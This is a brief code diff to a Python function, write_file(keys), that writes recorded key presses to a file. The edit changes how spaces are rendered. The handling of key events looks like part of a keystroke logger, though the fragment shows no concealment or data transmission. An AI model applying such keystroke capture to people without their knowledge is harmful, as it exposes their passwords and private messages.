@@ -21,7 +21,7 @@ def write_file(keys):
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
-                f.write('  ')
+                f.write('\n\n')
             elif k.find("key") == -1:
                 f.write(k)
 
